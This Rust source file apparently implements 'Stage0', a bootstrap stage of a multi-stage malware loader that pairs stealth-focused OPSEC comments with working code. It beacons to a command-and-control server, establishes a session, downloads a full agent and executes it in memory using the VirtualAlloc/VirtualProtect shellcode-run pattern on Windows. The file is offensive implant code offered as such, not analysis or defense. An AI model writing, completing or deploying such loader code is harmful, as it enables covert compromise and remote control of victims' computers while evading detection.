//! Stage 3: Stage0 - Position-Independent Bootstrap Payload
//!
//! **Purpose**: Minimal bootstrap that contacts C2 and downloads the full agent
//!
//! **Why this stage exists**:
//! - Keeps ESTER and JAVELIN small and generic
//! - Only Stage0 contains C2-specific logic
//! - Can be updated independently from earlier stages
//! - Downloads full agent capabilities on demand
//!
//! **OPSEC Considerations**:
//! - Runs entirely in memory (loaded by JAVELIN)
//! - Position-independent code (no fixed addresses)
//! - Minimal network signature (single beacon + download)
//! - Full agent only downloaded after successful bootstrap
//!
//! **Separation of Responsibilities**:
//! - Stage0 ONLY handles initial C2 contact and agent download
//! - Stage0 does NOT include full agent capabilities
//! - Full agent is downloaded after successful session establishment

pub mod beacon;
pub mod config;
pub mod download;
pub mod network;

pub use beacon::send_initial_beacon;
pub use config::get_c2_server;
pub use download::download_agent;
pub use network::establish_session;

/// Main entry point for Stage0
///
/// This function is called by JAVELIN after loading Stage0 into memory
///
/// **Execution flow**:
/// 1. Send initial beacon to C2
/// 2. Establish encrypted session (TLS)
/// 3. Perform key exchange if needed
/// 4. Download full agent from C2
/// 5. Execute full agent in memory
///
/// # Returns
///
/// * `0` - Success
/// * `1` - Failure
#[no_mangle]
pub extern "C" fn stage0_main() -> i32 {
    #[cfg(feature = "dev")]
    println!("[STAGE0] Bootstrap payload initializing...");

    match run_bootstrap() {
        Ok(_) => {
            #[cfg(feature = "dev")]
            println!("[STAGE0] Bootstrap complete");
            0
        }
        Err(e) => {
            #[cfg(feature = "dev")]
            eprintln!("[STAGE0] Bootstrap failed: {:?}", e);
            1
        }
    }
}

/// Runs the bootstrap sequence
fn run_bootstrap() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(feature = "dev")]
    println!("[STAGE0] Starting bootstrap sequence");

    // Step 1: Send initial beacon
    #[cfg(feature = "dev")]
    println!("[STAGE0] Sending initial beacon...");
    
    send_initial_beacon()?;

    // Step 2: Establish session
    #[cfg(feature = "dev")]
    println!("[STAGE0] Establishing session...");
    
    let mut session = establish_session()?;

    // Step 3: Download full agent
    #[cfg(feature = "dev")]
    println!("[STAGE0] Downloading full agent...");
    
    let agent_bytes = download_agent(&mut session)?;

    // Step 4: Execute full agent in memory
    #[cfg(feature = "dev")]
    println!("[STAGE0] Executing full agent ({} bytes)", agent_bytes.len());
    
    execute_agent(&agent_bytes)?;

    Ok(())
}

/// Executes the downloaded agent in memory
fn execute_agent(_agent_bytes: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    // Allocate memory for the agent
    #[cfg(target_os = "windows")]
    {
        use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};

        unsafe {
            // Allocate as RW
            let addr = VirtualAlloc(
                std::ptr::null_mut(),
                _agent_bytes.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );

            if addr.is_null() {
                return Err("Failed to allocate memory for agent".into());
            }

            // Copy agent to memory
            std::ptr::copy_nonoverlapping(_agent_bytes.as_ptr(), addr as *mut u8, _agent_bytes.len());

            // Change to RX
            let mut old_protect = 0u32;
            VirtualProtect(addr, _agent_bytes.len(), PAGE_EXECUTE_READ, &mut old_protect);

            // Execute agent
            let agent_entry: extern "C" fn() = std::mem::transmute(addr);
            agent_entry();
        }
        
        Ok(())
    }

    #[cfg(not(target_os = "windows"))]
    {
        Err("Non-Windows execution not yet implemented".into())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_stage0_config() {
        // Verify configuration is accessible
        let server = get_c2_server();
        assert!(!server.is_empty());
    }
}
